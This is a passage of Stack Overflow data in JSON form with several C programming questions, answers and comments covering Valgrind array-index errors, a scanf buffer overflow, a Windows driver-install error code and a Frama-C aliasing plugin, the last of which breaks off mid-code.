"user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/31b07f4a51ba2f420336f650c96bc5d4?s=128&d=identicon&r=PG&f=1", "display_name": "Ollu_", "link": "https://stackoverflow.com/users/7123410/ollu"}, "edited": false, "score": 0, "creation_date": 1518617139, "post_id": 48788958, "comment_id": 84579867, "body": "my call to <code>growArray(&amp;nodes, SIZE, id)</code> to <code>growArray(&amp;nodes, SIZE, id+1)</code> and it fixed the original issue. Many thanks."}], "tags": [], "owner": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "is_accepted": true, "score": 1, "last_activity_date": 1518617028, "last_edit_date": 1518617028, "creation_date": 1518616626, "answer_id": 48788958, "question_id": 48788002, "link": "https://stackoverflow.com/questions/48788002/valgrind-errors-when-dynamically-resizing-array-in-c/48788958#48788958", "title": "Valgrind errors when dynamically resizing array in C", "body": "<p>Array indexes in C are zero-based. You resize your <code>nodes</code> array to the size of <code>id</code>, and then access <code>nodes[id]</code>. It does not exist as it is outside of range [0, id-1]. Thus, valid elements are <code>nodes[0]</code> through <code>nodes[id-1]</code>.</p>\n"}], "owner": {"reputation": 111, "user_id": 7123410, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/31b07f4a51ba2f420336f650c96bc5d4?s=128&d=identicon&r=PG&f=1", "display_name": "Ollu_", "link": "https://stackoverflow.com/users/7123410/ollu"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 100, "favorite_count": 0, "accepted_answer_id": 48788958, "answer_count": 1, "score": 0, "last_activity_date": 1518617028, "creation_date": 1518613600, "last_edit_date": 1518616789, "question_id": 48788002, "link": "https://stackoverflow.com/questions/48788002/valgrind-errors-when-dynamically-resizing-array-in-c", "title": "Valgrind errors when dynamically resizing array in C", "body": "<p>I am trying to read from a file a list of values that are defined like</p>\n\n<pre><code>0001Text here\n</code></pre>\n\n<p>Where the 0001 is the id and the rest is the label. </p>\n\n<p>The file is read in correctly and that part works fine but when I try and add the items to an array that I dynamically resize Valgrind gives these errors:</p>\n\n<pre><code>==9005== Invalid read of size 8\n==9005==    at 0x108DB0: processFile (in /trees)\n==9005==    by 0x108BEE: main (in /trees)\n==9005==  Address 0x521d368 is 0 bytes after a block of size 24 alloc'd\n==9005==    at 0x4C31D2F: realloc (in /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so)\n==9005==    by 0x10903E: growArray (in /trees)\n==9005==    by 0x108D76: processFile (in /trees)\n==9005==    by 0x108BEE: main (in /trees)\n==9005== \n==9005== Invalid write of size 8\n==9005==    at 0x108DD6: processFile (in /trees)\n==9005==    by 0x108BEE: main (in /trees)\n==9005==  Address 0x521d368 is 0 bytes after a block of size 24 alloc'd\n==9005==    at 0x4C31D2F: realloc (in /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so)\n==9005==    by 0x10903E: growArray (in /trees)\n==9005==    by 0x108D76: processFile (in /trees)\n==9005==    by 0x108BEE: main (in /trees)\n==9005== \n</code></pre>\n\n<p>I realise that the error is on the line I have marked in the code below but i cannot figure out why these errors are happening. I thought it may be to do with the values not being initialised properly but I'm not sure that is correct.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stddef.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;errno.h&gt;\n\ntypedef struct node {\n          char  *label;\n  unsigned int   n;\n} NODE;\ntypedef NODE TREE;\n\nint growArray(TREE **, int, int);\nint processFile(FILE **, char *);\n\nint main (int argc, char **argv) {\n  FILE *fp;   /* the file pointer */\n\n  processFile(&amp;fp, argv[1]);\n  return 0;\n}\n\nint processFile(char *filename) {\n  if ((*fp = fopen(fileName, \"r\")) == NULL) {\n      printf(\"Unable to read file: %d: %s\\n\", errno, strerror(errno));\n      exit(1);\n  }\n\n  /* array to hold all nodes. The index is the nodeID */\n  int SIZE = 1;\n  TREE *nodes = (TREE *)calloc(SIZE, sizeof(NODE));\n\n  if (nodes == NULL) {\n    fprintf(stderr, \"Cannot allocate initial memory for array.\\n\");\n    exit(1);\n  }\n\n  /* checks the line is 4 digits, followed by 63 characters that aren't a */\n  /* carriage return or newline                                           */\n  int id; char text[64];\n  while (fscanf(*fp, \" %4d%63[^\\r^\\n] \", &amp;id, text) == 2){\n    SIZE = growArray(&amp;nodes, SIZE, id);\n\n    /* ----------error line---------- */\n    nodes[id].label = (char *)realloc(nodes[id].label, (strlen(text)+1));\n\n    strcpy(nodes[id].label, text);\n\n    fprintf(stderr, \"%5d: %s\\n\", id, text);\n    return 0;\n  }\n}\n\nint growArray(TREE **array, int curSize, int id) {\n  if (curSize &gt; id) return curSize;\n\n  TREE *temp = (TREE *)realloc(*array, (id * sizeof(NODE)));\n\n  if (temp == NULL) {\n    fprintf(stderr, \"Cannot allocate more memory.\\n\");\n    exit(1);\n  } else {\n    *array = temp;\n  }\n  return id;\n}\n</code></pre>\n\n<p>Where am I going wrong here and what could I do to fix these issues?</p>\n"}, {"tags": ["c", "linux", "loops", "gcc", "scanf"], "comments": [{"owner": {"reputation": 283, "user_id": 3726844, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/3tg8U.jpg?s=128&g=1", "display_name": "LotoLo", "link": "https://stackoverflow.com/users/3726844/lotolo"}, "edited": false, "score": 1, "creation_date": 1518612438, "post_id": 48787502, "comment_id": 84576740, "body": "What are your compile options? I&#39;ve compiled your code with the same gcc version and dim is not zero after the first loop."}, {"owner": {"reputation": 8984, "user_id": 2485966, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dZj6A.jpg?s=128&g=1", "display_name": "Ruud Helderman", "link": "https://stackoverflow.com/users/2485966/ruud-helderman"}, "edited": false, "score": 11, "creation_date": 1518612763, "post_id": 48787502, "comment_id": 84576958, "body": "I guess <code>scanf(&quot; %1[)]&quot;, &amp;end)</code> is exceeding the bounds of <code>end</code> (remember that strings in C are NUL-terminated) and overwrites the next variable in memory, being <code>dim</code> (because stacks are typically &#39;hanging&#39;). Try: <code>char end[2];</code> or <code>char end[99];</code> or whatever is sufficient here."}, {"owner": {"reputation": 18509, "user_id": 939410, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bb161e6bf2e1dded07d3fd921f487334?s=128&d=identicon&r=PG", "display_name": "Art", "link": "https://stackoverflow.com/users/939410/art"}, "edited": false, "score": 1, "creation_date": 1518612850, "post_id": 48787502, "comment_id": 84577019, "body": "The scanf is definitely overwriting it."}, {"owner": {"reputation": 3209, "user_id": 5794048, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Egkox.jpg?s=128&g=1", "display_name": "Murphy", "link": "https://stackoverflow.com/users/5794048/murphy"}, "edited": false, "score": 4, "creation_date": 1518613400, "post_id": 48787502, "comment_id": 84577378, "body": "There is no such thing as &quot;Linux C&quot;. There are compilers on Linux that may support several C standards, and sometimes flavours of their own. And there are Linux specific system calls. However your program doesn&#39;t use any of them."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 1, "creation_date": 1518613642, "post_id": 48787502, "comment_id": 84577512, "body": "Please provide a <i>minimal</i> input that reproduces the problem."}, {"owner": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "edited": false, "score": 1, "creation_date": 1518613781, "post_id": 48787502, "comment_id": 84577606, "body": "The problem is certainly in <code>scanf(&quot; %1[)]&quot;, &amp;end)</code>; note that writing out of bounds of an array causes undefined behavior, so anything could happen including the appearance of correct execution-- it is important to be careful with array bounds to avoid UB in C."}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 1, "creation_date": 1518613792, "post_id": 48787502, "comment_id": 84577614, "body": "If suddenly variables unexpected change their value, this very often dues to the code messing up the memory, (at least) then <a href=\"http://valgrind.org\" rel=\"nofollow noreferrer\">Valgrind</a> is your friend."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 2, "creation_date": 1518614274, "post_id": 48787502, "comment_id": 84577923, "body": "Each time variables change &quot;magically&quot;, your first thought should be: <i>buffer overflow</i> and <i>array indexes out of range</i>."}], "answers": [{"tags": [], "owner": {"reputation": 59, "user_id": 3000327, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9289838e8690842c13baef28597971c9?s=128&d=identicon&r=PG&f=1", "display_name": "user3000327", "link": "https://stackoverflow.com/users/3000327/user3000327"}, "is_accepted": true, "score": 0, "last_activity_date": 1522350517, "creation_date": 1522350517, "answer_id": 49563418, "question_id": 48787502, "link": "https://stackoverflow.com/questions/48787502/why-does-while-loop-clear-a-variable/49563418#49563418", "title": "Why does while loop clear a variable?", "body": "<p>As Ruud Helderman said reading just one char via </p>\n\n<blockquote>\n  <p>scanf(\" %1[)]\", &amp;end)</p>\n</blockquote>\n\n<p>doesn't mean it's not a string (and therefore null terminated). So I went, obviously, into a buffer overflow.</p>\n\n<p>Thanks all</p>\n"}], "owner": {"reputation": 59, "user_id": 3000327, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9289838e8690842c13baef28597971c9?s=128&d=identicon&r=PG&f=1", "display_name": "user3000327", "link": "https://stackoverflow.com/users/3000327/user3000327"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 207, "favorite_count": 0, "accepted_answer_id": 49563418, "answer_count": 1, "score": 2, "last_activity_date": 1522350517, "creation_date": 1518612059, "last_edit_date": 1518652906, "question_id": 48787502, "link": "https://stackoverflow.com/questions/48787502/why-does-while-loop-clear-a-variable", "title": "Why does while loop clear a variable?", "body": "<p>I'm using gcc version 7.2.0 (Ubuntu 7.2.0-8ubuntu3) along with this program:</p>\n\n<pre><code>int main(){\n    double buffer;\n    double *vec = NULL;\n    int dim = 0;\n    char end;\n\n    printf(\"ej: (1.5 2 3.7).\\tVector: \");\n    scanf(\" %*[()]\");\n    do{\n        vec = (double *) realloc(vec, (dim+1) * sizeof(double));\n        scanf(\" %lf\", &amp;buffer);\n        vec[dim++] = buffer;\n    }while (!scanf(\" %1[)]\", &amp;end));\n    //&lt;- Here dim returns to 0\n    printf(\"\\n\\t( \");\n    for (int componente=0; componente&lt;dim; componente++)\n        printf(\"%6.2lf\", vec[componente]);\n    printf(\" )\\n\");\n\n    return EXIT_SUCCESS;\n}\n</code></pre>\n\n<p>The <code>dim</code> variable returns to 0 (but exists --at least <code>gdb</code> stands so). The only way to keep its value alive is to declare it static.</p>\n\n<p>I've also tried to compile without optimization.</p>\n\n<p>Am I missing something about C? Shouldn't it stay alive?</p>\n"}, {"tags": ["c++", "c", "winapi", "setupapi"], "comments": [{"owner": {"reputation": 35031, "user_id": 1889329, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/57bec3f0b9c5879cdd9d9fa2e8629318?s=128&d=identicon&r=PG&f=1", "display_name": "IInspectable", "link": "https://stackoverflow.com/users/1889329/iinspectable"}, "edited": false, "score": 0, "creation_date": 1518615229, "post_id": 48787349, "comment_id": 84578549, "body": "The error code <code>3758096943</code> does not match <code>ERROR_NO_CATALOG_FOR_OEM_INF</code>. Please show the code you use to determine the error code."}, {"owner": {"reputation": 959, "user_id": 6751556, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/PbVfI.png?s=128&g=1", "display_name": "Suraj S", "link": "https://stackoverflow.com/users/6751556/suraj-s"}, "reply_to_user": {"reputation": 35031, "user_id": 1889329, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/57bec3f0b9c5879cdd9d9fa2e8629318?s=128&d=identicon&r=PG&f=1", "display_name": "IInspectable", "link": "https://stackoverflow.com/users/1889329/iinspectable"}, "edited": false, "score": 0, "creation_date": 1518615778, "post_id": 48787349, "comment_id": 84578916, "body": "@IInspectable Added code, and how do you tell the error code does not match, I used err.exe to find it."}, {"owner": {"reputation": 959, "user_id": 6751556, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/PbVfI.png?s=128&g=1", "display_name": "Suraj S", "link": "https://stackoverflow.com/users/6751556/suraj-s"}, "reply_to_user": {"reputation": 35031, "user_id": 1889329, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/57bec3f0b9c5879cdd9d9fa2e8629318?s=128&d=identicon&r=PG&f=1", "display_name": "IInspectable", "link": "https://stackoverflow.com/users/1889329/iinspectable"}, "edited": false, "score": 0, "creation_date": 1518617911, "post_id": 48787349, "comment_id": 84580415, "body": "Interesting, when I build the exe in x64, I do not get the error, Everything works as it should. But should it not throw ERROR_IN_WOW64 instead of ERROR_NO_CATALOG_FOR_OEM_INF ????"}, {"owner": {"reputation": 10424, "user_id": 3408572, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/0f3a08b145553b98749d3d0572d01265?s=128&d=identicon&r=PG&f=1", "display_name": "andlabs", "link": "https://stackoverflow.com/users/3408572/andlabs"}, "reply_to_user": {"reputation": 35031, "user_id": 1889329, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/57bec3f0b9c5879cdd9d9fa2e8629318?s=128&d=identicon&r=PG&f=1", "display_name": "IInspectable", "link": "https://stackoverflow.com/users/1889329/iinspectable"}, "edited": false, "score": 0, "creation_date": 1518638189, "post_id": 48787349, "comment_id": 84592748, "body": "@IInspectable actually it does: <code>ERROR_NO_CATALOG_FOR_OEM_INF</code> is defined as <code>(APPLICATION_ERROR_MASK|ERROR_SEVERITY_ERROR|0x22F)</code>, <code>APPLICATION_ERROR_MASK</code> is <code>0x20000000</code>, and <code>ERROR_SEVERITY_ERROR</code> is <code>0xC0000000</code>, which gives us <code>0x20000000|0xC0000000|0x22F</code> == <code>0xE000022F</code> == <code>3758096943</code>. (Yes, I know; I&#39;m surprised it&#39;s not a standard Windows error code too.)"}, {"owner": {"reputation": 35031, "user_id": 1889329, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/57bec3f0b9c5879cdd9d9fa2e8629318?s=128&d=identicon&r=PG&f=1", "display_name": "IInspectable", "link": "https://stackoverflow.com/users/1889329/iinspectable"}, "reply_to_user": {"reputation": 10424, "user_id": 3408572, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/0f3a08b145553b98749d3d0572d01265?s=128&d=identicon&r=PG&f=1", "display_name": "andlabs", "link": "https://stackoverflow.com/users/3408572/andlabs"}, "edited": false, "score": 0, "creation_date": 1518650920, "post_id": 48787349, "comment_id": 84598423, "body": "@andlabs: Actually, that&#39;s <code>-536870353</code>. <code>NTSTATUS</code> values are signed."}], "owner": {"reputation": 959, "user_id": 6751556, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/PbVfI.png?s=128&g=1", "display_name": "Suraj S", "link": "https://stackoverflow.com/users/6751556/suraj-s"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 405, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1518615767, "creation_date": 1518611613, "last_edit_date": 1518615767, "question_id": 48787349, "link": "https://stackoverflow.com/questions/48787349/error-in-diinstalldevice-installselecteddriver-error-no-catalog-for-oem-inf", "title": "Error in DiInstallDevice, InstallSelectedDriver - ERROR_NO_CATALOG_FOR_OEM_INF", "body": "<p>Okay, So I am getting this weird error stating \"<strong>ERROR_NO_CATALOG_FOR_OEM_INF</strong>\" whenever I call DiInstallDevice, InstallSelectedDriver. The error code returned is\n<strong>3758096943</strong>. When I look it up in err.exe, it says</p>\n\n<pre><code># for decimal -536870353 / hex 0xe000022f :\n  ERROR_NO_CATALOG_FOR_OEM_INF                                  setupapi.h\n# for hex 0xffffffff / decimal -1 :\n  NO_TITLE                                                      ftsiface.h\n  USE_DEFAULT                                                   ftsiface.h\n  JET_wrnNyi                                                    esent98.h\n# /* Function Not Yet Implemented */\n  LZERROR_BADINHANDLE                                           lzexpand.h\n# /* invalid input handle */\n  MAPI_DIAG_NO_DIAGNOSTIC                                       mapidefs.h\n  MSIDBERROR_FUNCTIONERROR                                      msiquery.h\n# function error\n  ERROR_UNHANDLED_ERROR                                         ntddchgr.h\n# Unknown error condition\n  PDR_ERROR                                                     penwin.h\n# parameter or unspecified error\n  ICERR_UNSUPPORTED                                             vfw.h\n  ERROR_UNHANDLED_ERROR                                         winioctl.h\n# Unknown error condition\n# 11 matches found for \"3758096943\"\n</code></pre>\n\n<p>I am using setupapi, therefore the error, Internet searches reveal nothing whatsoever apart from the error being associated with the \"<strong>SetupCopyOEMInf()</strong>\" Which I have no relation to. The Driver in Question is an Intel HD 520 Signed Driver. I have verified it and downloaded it via Microsoft update catalog. </p>\n\n<p>The driver is Selected using <strong>SetupDiSetSelectedDriver()</strong> and the correct device is selected using <strong>SetupDiSetSelectedDevice()</strong>. If anyone can point me in the right direction itwould be great!.</p>\n\n<p>Code :</p>\n\n<pre><code>PopulateDeviceInstaceIds(L\"PCI\\\\VEN_8086&amp;DEV_1916\");\n            SP_DRVINFO_DATA drvData;\n            SP_DRVINFO_DETAIL_DATA drvDetailData;\n            SP_DEVINFO_DATA LocDevData;\n            MakeDevClassHandles(handle,instancesOfDevice.at(0).c_str());\n            SetDRVINFO(&amp;LocDevData,&amp;drvDetailData,&amp;drvData,L\"Intel Corporation\",L\"22.20.16.4836\",TRUE);\n            std::cout&lt;&lt;SetupDiSetSelectedDevice(handle,&amp;LocDevData)&lt;&lt;endl;\n            std::cout&lt;&lt;SetupDiSetSelectedDriver(handle,&amp;LocDevData,&amp;drvData)&lt;&lt;endl;\n            if(&amp;drvData!=NULL)\n            {\n                HMODULE libHandle = LoadLibraryW(L\"newdev.dll\");\n                lpfnInstallSelectedDriver addr;\n                DWORD rebootRec;\n                addr = (lpfnInstallSelectedDriver)GetProcAddress(libHandle,\"InstallSelectedDriver\");\n                if(addr!=NULL &amp;&amp; addr(NULL,handle,NULL,TRUE,&amp;rebootRec))\n                {\n\n                }\n                else\n                    cout&lt;&lt;\"InstallSelectedDriver ERR : \"&lt;&lt;GetLastError();\n                 if(DiInstallDevice(NULL,handle,&amp;LocDevData,&amp;drvData,0,&amp;nRebo))\n                {\n\n                }\n                else\n                {\n                    cout&lt;&lt;\"DiInstall Device error : \"&lt;&lt;GetLastError();\n                    std::cout&lt;&lt;\"\\n\\nWaiting for upto 10 seconds for changes to reflect..\";\n                    Sleep(10000);\n</code></pre>\n\n<p>I guess this code will be enough, if not please let me know. The entire code is a few hundred lines, so. </p>\n\n<p>The <strong>SetDRVINFO()</strong> function just sets the correct device and driver in the structures, i have verified them while debugging. Both the else cases throw the same error.</p>\n"}, {"tags": ["c", "pointers", "frama-c"], "comments": [{"owner": {"reputation": 8560, "user_id": 1633665, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b603faf464ae55fcdd7dc2fb3b7ac063?s=128&d=identicon&r=PG", "display_name": "Virgile", "link": "https://stackoverflow.com/users/1633665/virgile"}, "edited": false, "score": 1, "creation_date": 1518616595, "post_id": 48785495, "comment_id": 84579514, "body": "Your code is not complete: you&#39;re calling a method <code>self#do_call</code> which does not exist in <code>Visitor.frama_c_inplace</code>. This is the one that gets called by the <code>int* a = malloc(n)</code> pattern, thus it is not possible to give an answer without knowing what it does. In addition, you should also have a case for the <code>Call</code> constructor in <code>vinst</code>, as this will capture instruction of the form <code>p = f(x)</code>."}, {"owner": {"reputation": 79, "user_id": 7593365, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/23e98eb6b35fb1951cd7133e4dc91883?s=128&d=identicon&r=PG&f=1", "display_name": "R. Fomba", "link": "https://stackoverflow.com/users/7593365/r-fomba"}, "reply_to_user": {"reputation": 8560, "user_id": 1633665, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b603faf464ae55fcdd7dc2fb3b7ac063?s=128&d=identicon&r=PG", "display_name": "Virgile", "link": "https://stackoverflow.com/users/1633665/virgile"}, "edited": false, "score": 0, "creation_date": 1518694274, "post_id": 48785495, "comment_id": 84615044, "body": "@Virgile I reedited my post and added the body of  <code>do_call</code> method and some cases for the <code>Call</code> constructor."}], "answers": [{"comments": [{"owner": {"reputation": 79, "user_id": 7593365, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/23e98eb6b35fb1951cd7133e4dc91883?s=128&d=identicon&r=PG&f=1", "display_name": "R. Fomba", "link": "https://stackoverflow.com/users/7593365/r-fomba"}, "edited": false, "score": 0, "creation_date": 1520957185, "post_id": 48814189, "comment_id": 85525046, "body": "Thank @Virgile, you&#39;re right, I was confused about formal parameters of the function declaration. As you suggested, I factorized most of the work between Local_init (with Cons_init) and Call cases. So now, I evaluate expressions in ags list and do a mach between enode and: <code>SizeOf typ -&gt; Format.printf &quot;sizeof(%a) &quot; Printer.pp_typ typ</code>, <code>Lval(Var e, _) -&gt; Format.printf &quot;#%s#  &quot; e.vname</code> and <code>BinOp((Mult), {enode = Const _}, {enode = SizeOf typ}, _)</code>. But it work only for <code>malloc(sizeof(int))</code> case not for <code>malloc(10 * sizeof(int))</code>."}, {"owner": {"reputation": 8560, "user_id": 1633665, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b603faf464ae55fcdd7dc2fb3b7ac063?s=128&d=identicon&r=PG", "display_name": "Virgile", "link": "https://stackoverflow.com/users/1633665/virgile"}, "reply_to_user": {"reputation": 79, "user_id": 7593365, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/23e98eb6b35fb1951cd7133e4dc91883?s=128&d=identicon&r=PG&f=1", "display_name": "R. Fomba", "link": "https://stackoverflow.com/users/7593365/r-fomba"}, "edited": false, "score": 0, "creation_date": 1520971165, "post_id": 48814189, "comment_id": 85533114, "body": "Just to be clear: my suggestion in the answer was to let EVA taking care of evaluating the expression, or, if you&#39;re only interested in expressions that are compile-time constant, the syntactic evaluation function in <code>Cil</code>. In any case, comments are probably not the best place to investigate. You should ask a new question, again with a <a href=\"https://stackoverflow.com/help/mcve\">complete example</a>"}], "tags": [], "owner": {"reputation": 8560, "user_id": 1633665, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b603faf464ae55fcdd7dc2fb3b7ac063?s=128&d=identicon&r=PG", "display_name": "Virgile", "link": "https://stackoverflow.com/users/1633665/virgile"}, "is_accepted": false, "score": 0, "last_activity_date": 1518720036, "creation_date": 1518720036, "answer_id": 48814189, "question_id": 48785495, "link": "https://stackoverflow.com/questions/48785495/frama-c-how-to-access-a-malloc-variable-allocated-by-value-plugin/48814189#48814189", "title": "Frama-c: how to access a __malloc* variable allocated by value plugin", "body": "<p>What you're trying to achieve is not extremely clear, but there are several points in your <code>do_call</code> methods that look suspicious:</p>\n\n<ul>\n<li>From what I've understood, you should treat <code>int *x = malloc (sizeof(*x));</code> and <code>x = malloc(sizeof(*x));</code> in quite similar ways. In other words, you can probably factorize most of the work between <code>Local_init</code> (with <code>Cons_init</code>) and <code>Call</code> cases</li>\n<li>You should probably discriminate against the name of the callee. Basically only <code>malloc</code>, <code>calloc</code> and <code>realloc</code> are relevant here.</li>\n<li>(Probably the main source of your issue at the moment) You're confusing the formal parameters of the function declaration with the actual parameters of the call. At call site, EVA has no value associated with the formers: you should evaluate the expressions in the <code>args</code> list instead of the <code>varinfo</code> in the <code>params</code> list.</li>\n</ul>\n"}], "owner": {"reputation": 79, "user_id": 7593365, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/23e98eb6b35fb1951cd7133e4dc91883?s=128&d=identicon&r=PG&f=1", "display_name": "R. Fomba", "link": "https://stackoverflow.com/users/7593365/r-fomba"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 138, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1518720036, "creation_date": 1518605894, "last_edit_date": 1518693961, "question_id": 48785495, "link": "https://stackoverflow.com/questions/48785495/frama-c-how-to-access-a-malloc-variable-allocated-by-value-plugin", "title": "Frama-c: how to access a __malloc* variable allocated by value plugin", "body": "<p>I start with Frama-c, so I do not master it well enough. I would like to use Frama-c to implement a pointer aliasing analyzer. Unless I'm mistaken, it seems to me that value plugin does not give information about pointer aliasing.</p>\n\n<p>For a start, here is what I have:</p>\n\n<pre><code>class vtest = object(self)\n   inherit Visitor.frama_c_inplace as super\n\n   method private try_khow_exp_from_inst vi loc exp (typ : string) = \n     let vname = vi.vname in \n     match exp.enode with\n     | Const _ | SizeOfE _ | AlignOfE _ | SizeOf _ | AlignOf _ | SizeOfStr _-&gt; \n       Format.printf \"Local %s of #%s# (of type %a) with a constant (%a) at %a @.\\n\" \n       typ vname Printer.pp_typ vi.vtype Printer.pp_exp exp Printer.pp_location loc;\n       if Cil.isPointerType vi.vtype then \n         Format.printf \"#%s# is a pointer type !!! warning: initialization makes pointer from integer without a cast @.\\n\" vname;\n\n     | Lval(Var v, _) -&gt; \n       Format.printf \"Local %s of #%s# with a variable (%s) at %a @.\\n\" \n       typ vname v.vname Printer.pp_location loc;\n       if Cil.isPointerType vi.vtype &amp;&amp; Cil.isPointerType v.vtype then \n         Format.printf \"Pointer #%s# is aliased with pointer (%s) --&gt; #%s# can't be declared as restrict neither (%s) @.\\n\" \n         vname v.vname vname v.vname;\n\n     | Lval (Mem e, _) -&gt; \n       let state = Db.Value.get_state (Kstmt (Extlib.the self#current_stmt)) in\n       Format.printf \"Local %s of variable #%s# with the value pointed by (%a) pointer at %a @.\\n\"\n       typ vname Printer.pp_exp e Printer.pp_location loc;\n\n     | UnOp(op, {enode = Lval (Mem {enode = Lval(Var v_un, _)}, _)}, _) when Cil.isPointerType v_un.vtype -&gt; \n       Format.printf \"Local %s of variable #%s# with an unary operation on pointer (%s) at %a @.\\n\"\n       typ vname v_un.vname Printer.pp_location loc;\n\n     | BinOp((PlusPI | IndexPI | MinusPI | MinusPP), {enode = Lval(Var v_ptr, _)}, e2, _) -&gt; \n       if Cil.isPointerType vi.vtype &amp;&amp; Cil.isPointerType v_ptr.vtype then\n       begin\n         Format.printf \"Local %s of pointer #%s# with pointer (%s) +|- an offset at %a @.\\n\" \n         typ vname v_ptr.vname Printer.pp_location loc;\n         Format.printf \"Pointer #%s# is aliased with pointer (%s) --&gt; #%s# can't be declared as restrict neither (%s) @.\\n\" \n         vname v_ptr.vname vname v_ptr.vname;\n       end\n\n     | StartOf(Var va, _) when Cil.isPointerType vi.vtype -&gt; \n       Format.printf \"Local %s of pointer #%s# with start addr of array (%s) at %a @.\\n\" typ vname va.vname Printer.pp_location loc;\n       Format.printf \"Pointer #%s# is aliased with array (%s) --&gt; #%s# can't be declared as restrict@.\\n\" \n       vname va.vname vname;\n\n     | AddrOf(Var v_ad, _) when Cil.isPointerType vi.vtype -&gt; \n       Format.printf \"Local %s of pointer #%s# with address of variable (%s) at %a @.\\n\" \n       typ vname v_ad.vname Printer.pp_location loc;\n       Format.printf \"Pointer #%s# is aliased with variable (%s) --&gt; #%s# can't be declared as restrict @.\\n\" \n       vname v_ad.vname vname;\n\n     | _ -&gt; Format.printf \"Found unknow case at %a...@.\\n\" Printer.pp_location loc;\n\nmethod private do_call var f args l =\nlet kf = Globals.Functions.get f in \nlet name = Kernel_function.get_name kf in\nlet params = Globals.Functions.get_params kf in\nFormat.printf \"Local init of #%s# at %a: through a call to (%s) with following params --&gt; @.\" \nvar.vname Printer.pp_location l name;\nif params != [] then List.iter(fun vi -&gt; \n                               let lval = (Var vi, NoOffset) in (* make an lval from a varinfo *)\n                               let loc = !Db.Value.lval_to_loc self#current_kinstr ~with_alarms:CilE.warn_none_mode lval in \n                               Db.Value.fold_state_callstack (fun state () -&gt; (* for each state in the callstack *)\n                                let value = Db.Value.find state loc in (* obtain value for location *)\n                                Format.printf \"%a -&gt; %a@.\" Printer.pp_varinfo vi\n                                Locations.Location_Bytes.pretty value (* print mapping *)\n                               ) () ~after:true self#current_kinstr\n                              ) params;\nFormat.printf \"@.\\n\"\n\nmethod! vinst i = \n  if Db.Value.is_reachable (Db.Value.get_state self#current_kinstr) then \n    match i with\n    | Local_init (vi, AssignInit(SingleInit e), loc) -&gt;  \n      let t = \"init\" in\n      self#try_khow_exp_from_inst vi loc e t;\n      Cil.SkipChildren\n\n    (*| Local_init (ci, AssignInit(CompoundInit _), loc)*)(**ToDo*)\n\n    | (Local_init(v, ConsInit(f, args, k), l)) when Cil.isPointerType v.vtype -&gt; begin\n       match k with\n       | Plain_func -&gt; self#do_call v f args l ; Cil.SkipChildren \n       | Constructor -&gt; Cil.SkipChildren\n    end\n\n    | Set((Var(vi),NoOffset), exp, place) -&gt; \n      let s = \"setting\" in\n      self#try_khow_exp_from_inst vi place exp s; \n      Cil.SkipChildren\n\n    | Call(Some(Var call, _), 